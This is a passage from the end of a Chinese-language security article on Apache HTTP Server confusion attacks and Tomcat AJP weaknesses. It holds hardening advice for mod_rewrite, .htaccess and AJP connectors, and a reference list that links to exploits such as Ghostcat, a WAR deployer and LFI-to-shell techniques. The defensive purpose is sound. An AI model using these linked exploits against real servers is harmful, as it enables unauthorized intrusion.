3. **审计 `mod_rewrite` 规则**，尤其关注 `%3f` 处理和反向代理捕获
4. **Tomcat AJP 配置加强**：
   - 设置强 `secret`
   - 绑定到 `address="127.0.0.1"` 除非需要外部访问
   - 配置严格的 `allowedRequestAttributesPattern`
5. **定期审计 `.htaccess` 权限**，最小化 `AllowOverride` 范围
6. **在反向代理场景中**，验证 `mod_proxy_ajp` 版本并测试 HTTP/AJP 边界一致性
7. **Windows 部署**：禁用不必要的 `AllowEncodedSlashes`，确保 `MergeSlashes` 保持安全默认值

---

## 参考资料

- [Orange Tsai — Confusion Attacks: A Whole New Class of Apache HTTP Server Vulnerabilities](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)
- [Apache HTTP Server 2.4 官方漏洞列表](https://httpd.apache.org/security/vulnerabilities_24.html)
- [Apache mod_rewrite 源码 (2.4.58)](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)
- [Apache HTTP Server 配置模板](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)
- [Debian apache2 默认配置](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165)
- [Apache 2.4 Custom Error Responses (ErrorDocument)](https://httpd.apache.org/docs/2.4/custom-error.html)
- [Apache 2.4 Expressions and functions (file:)](https://httpd.apache.org/docs/2.4/expr.html)
- [Apache Module mod_status](https://httpd.apache.org/docs/2.4/mod/mod_status.html)
- [Apache Module mod_info](https://httpd.apache.org/docs/2.4/en/mod/mod_info.html)
- [Apache RewriteRule Flags (UnsafeAllow3F, UnsafePrefixStat)](https://httpd.apache.org/docs/2.4/rewrite/flags.html)
- [RFC 3875 — CGI Version 1.1, Section 6.2.2 Local Redirect Response](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2)
- [ZeroNights 2021 — Apache Handler Confusion (Dmitriev Maksim)](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf)
- [HTB Zero Write-up: .htaccess ErrorDocument LFI](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)
- [Docker PHP LFI Summary (Phith0n)](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)
- [PHP Docker 官方镜像](https://hub.docker.com/_/php)
- [Ghostcat (CVE-2020-1938) — Chaitin Tech](https://www.chaitin.cn/en/ghostcat)
- [Ghostcat Exploit (Exploit-DB)](https://www.exploit-db.com/exploits/48143)
- [AJPFuzzer — Doyensec](https://github.com/doyensec/ajpfuzzer)
- [Learning AJP — Doyensec Blog](https://blog.doyensec.com/2022/11/15/learning-ajp.html)
- [Tomcat AJP Connector 官方文档](https://tomcat.apache.org/tomcat-9.0-doc/config/ajp.html)
- [8009 — The Forgotten Tomcat Port (Diablohorn)](https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/)
- [Nginx AJP Module](https://github.com/dvershinin/nginx_ajp_module)
- [Nginx AJP Docker](https://github.com/ScribblerCoder/nginx-ajp-docker)
- [Tomcat Path Traversal via Reverse Proxy Mapping (Acunetix)](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)
- [Tomcat Example Scripts Leaks (Rapid7)](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)
- [tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer)
- [ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)
- [Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
